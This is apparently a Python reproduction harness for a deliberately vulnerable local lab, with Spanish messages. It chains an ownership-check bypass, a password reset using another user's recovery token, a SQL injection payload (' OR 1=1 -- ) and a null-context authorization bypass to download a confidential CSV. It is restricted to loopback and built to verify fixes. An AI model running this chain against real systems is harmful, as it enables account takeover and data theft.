"""Reproduce the lab using HTTP only, with the client's initial credentials."""
import argparse
from datetime import datetime, timezone
import getpass
import hashlib
import ipaddress
import json
import os
from pathlib import Path
import re
import secrets
from urllib.parse import urlsplit

import requests

PAYLOAD = "' OR 1=1 -- "
MARKER = b"DEMO_EXPORT_B_CONFIDENTIAL"


class DemoStopped(Exception):
    def __init__(self, stage, reason):
        self.stage = stage
        super().__init__(reason)


def local_url(value):
    parsed = urlsplit(value)
    if parsed.scheme not in ("http", "https") or parsed.username or parsed.password or parsed.query or parsed.fragment or parsed.path not in ("", "/"):
        raise ValueError("Indicá solo el origen HTTP local, sin credenciales ni rutas.")
    host = parsed.hostname
    if host == "localhost":
        host = "127.0.0.1"
    try:
        address = ipaddress.ip_address(host or "")
    except ValueError as error:
        raise ValueError("La demo solo acepta localhost o una IP de loopback.") from error
    if not address.is_loopback:
        raise ValueError("La demo solo acepta direcciones de loopback.")
    hostname = f"[{address}]" if address.version == 6 else str(address)
    port = f":{parsed.port}" if parsed.port else ""
    return f"{parsed.scheme}://{hostname}{port}"


class HttpActor:
    def __init__(self, base_url, label, events):
        self.base_url, self.label, self.events = base_url, label, events
        self.session = requests.Session()
        # Do not route the intentionally vulnerable demo through external proxies.
        self.session.trust_env = False
        self.csrf = ""
        self.user = None

    def request(self, stage, method, path, body=None, params=None):
        response = self.session.request(method, self.base_url + path, json=body, params=params,
                                        headers={"X-CSRF-Token": self.csrf} if method == "POST" else {},
                                        timeout=10, allow_redirects=False)
        # Never record session, password, token, recovery body or cookie headers.
        self.events.append({"stage": stage, "method": method, "path": path,
                            "status": response.status_code, "identity": self.label})
        return response

    def login(self, username, password, stage):
        state = self.request(stage, "GET", "/api/session")
        ensure(state.status_code == 200, stage, "No se pudo iniciar una sesión anónima.")
        self.csrf = state.json()["csrf_token"]
        response = self.request(stage, "POST", "/api/auth/login", {"username": username, "password": password})
        ensure(response.status_code == 200, stage, f"El inicio de sesión devolvió {response.status_code}.")
        self.csrf, self.user = response.json()["csrf_token"], response.json()["user"]

    def close(self):
        self.session.close()


def ensure(condition, stage, reason):
    if not condition:
        raise DemoStopped(stage, reason)


def run_chain(base_url, username, password, events, output):
    client = HttpActor(base_url, "cliente A", events)
    operator = HttpActor(base_url, "operador B", events)
    try:
        client.login(username, password, "inicio")
        ensure(client.user["role"] == "client", "inicio", "Se requieren credenciales de cliente.")
        own = client.request("inicio", "GET", "/api/tickets/1001")
        ensure(own.status_code == 200 and own.json()["assigned_operator"] is None, "inicio", "El ticket propio no cumple la precondición.")

        ticket = client.request("T1", "GET", "/api/tickets/1002")
        ensure(ticket.status_code == 200, "T1", f"La lectura del ticket ajeno devolvió {ticket.status_code}.")
        target = ticket.json().get("assigned_operator")
        ensure(target and target.get("id") and target.get("username"), "T1", "No se descubrió la identidad del operador.")
        target_org = ticket.json()["ticket"]["organization_id"]
        events[-1]["result"] = "Identidad del operador descubierta en el ticket ajeno."

        issued = client.request("T2", "POST", "/api/auth/recovery", {"username": username})
        ensure(issued.status_code == 202, "T2", "No se pudo solicitar recuperación propia.")
        inbox = client.request("T2", "GET", "/lab/inbox")
        ensure(inbox.status_code == 200, "T2", "No se pudo leer el buzón propio.")
        messages = inbox.json()["messages"]
        match = re.search(r"Token: ([\w-]+)", messages[0]["body"]) if messages else None
        ensure(match is not None, "T2", "No se encontró el token propio.")
        new_password = secrets.token_urlsafe(20)
        reset = client.request("T2", "POST", "/api/auth/reset-password", {
            "token": match.group(1), "user_id": target["id"], "new_password": new_password})
        ensure(reset.status_code == 200, "T2", f"El cambio de cuenta en recuperación devolvió {reset.status_code}.")
        events[-1]["result"] = "La contraseña del operador fue modificada con el token del cliente."
        operator.login(target["username"], new_password, "T2")
        ensure(operator.user["role"] == "operator", "T2", "La sesión obtenida no es de operador.")

        normal = operator.request("T3", "GET", "/api/exports/search", params={"q": ""})
        ensure(normal.status_code == 200, "T3", "Falló la búsqueda legítima.")
        legitimate = normal.json()["exports"]
        ensure(legitimate and not any(row["is_confidential"] for row in legitimate), "T3", "La búsqueda legítima revela datos confidenciales o no tiene semilla.")
        injected = operator.request("T3", "GET", "/api/exports/search", params={"q": PAYLOAD})
        ensure(injected.status_code == 200, "T3", f"La búsqueda alterada devolvió {injected.status_code}.")
        ensure(MARKER not in injected.content, "T3", "El catálogo filtró contenido del CSV.")
        candidates = [row for row in injected.json()["exports"] if row["is_confidential"] and row["organization_id"] == target_org]
        ensure(candidates, "T3", "La entrada no reveló el UUID confidencial; se trató como texto o quedó filtrada.")
        export_id = candidates[0]["id"]
        ensure(all(row["id"] != export_id for row in legitimate), "T3", "El UUID ya era visible sin inyección.")
        events[-1]["result"] = "UUID confidencial descubierto mediante la consulta SQL alterada."

        path = f"/api/exports/{export_id}/download"
        denied = operator.request("T4", "POST", path, {"context": {"purpose": "download"}})
        (output / "t4-normal.json").write_text(json.dumps({"status": denied.status_code, "body": denied.json()}, indent=2), encoding="utf-8")
        ensure(denied.status_code == 403 and MARKER not in denied.content, "T4", "La solicitud normal no fue denegada con 403.")
        downloaded = operator.request("T4", "POST", path, {"context": None})
        if downloaded.status_code != 200:
            (output / "t4-exception.json").write_text(json.dumps({"status": downloaded.status_code, "body": downloaded.json()}, indent=2), encoding="utf-8")
        ensure(downloaded.status_code == 200, "T4", f"La solicitud con context: null devolvió {downloaded.status_code}.")
        ensure(downloaded.headers.get("Content-Type", "").startswith("text/csv") and MARKER in downloaded.content,
               "T4", "La respuesta no contiene el CSV real con su marcador.")
        (output / "t4-exception.csv").write_bytes(downloaded.content)
        events[-1]["result"] = "CSV confidencial descargado con la misma sesión y el mismo UUID del rechazo 403."
        events[-1]["sha256"] = hashlib.sha256(downloaded.content).hexdigest()
        return {"outcome": "completed", "normal_download_status": 403, "exception_download_status": 200,
                "marker_verified": True}
    finally:
        client.close()
        operator.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://127.0.0.1:8000")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", help="Preferí el prompt o LAB_CLIENT_PASSWORD para evitar el historial de la terminal.")
    parser.add_argument("--output", type=Path, default=Path("evidence"))
    parser.add_argument("--expect-stop", choices=("T1", "T2", "T3", "T4"), help="Devuelve éxito solo si la corrección corta esa etapa.")
    args = parser.parse_args()
    try:
        base = local_url(args.url)
    except ValueError as error:
        parser.error(str(error))
    password = args.password or os.environ.get("LAB_CLIENT_PASSWORD") or getpass.getpass("Contraseña del cliente: ")
    output = args.output / (datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ") + "-" + secrets.token_hex(3))
    output.mkdir(parents=True, exist_ok=False)
    events = []
    try:
        result = run_chain(base, args.username, password, events, output)
        success = args.expect_stop is None
    except DemoStopped as error:
        result = {"outcome": "stopped", "stage": error.stage, "reason": str(error)}
        # An expected stop must also match the defined fixed behavior.
        expected_status = {"T1": 403, "T2": 400, "T3": 200, "T4": 400}.get(error.stage)
        success = args.expect_stop == error.stage and bool(events) and events[-1]["status"] == expected_status
    except (requests.RequestException, ValueError, KeyError, IndexError) as error:
        result = {"outcome": "error", "reason": f"Falló una precondición HTTP ({type(error).__name__})."}
        success = False
    report = {"timestamp": datetime.now(timezone.utc).isoformat(), "base_url": base, "events": events, **result}
    (output / "report.json").write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    for event in events:
        print(f"{event['stage']}: {event['method']} {event['path']} -> {event['status']} ({event['identity']})")
    print(json.dumps(result, ensure_ascii=False))
    print(f"Evidencias: {output}")
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
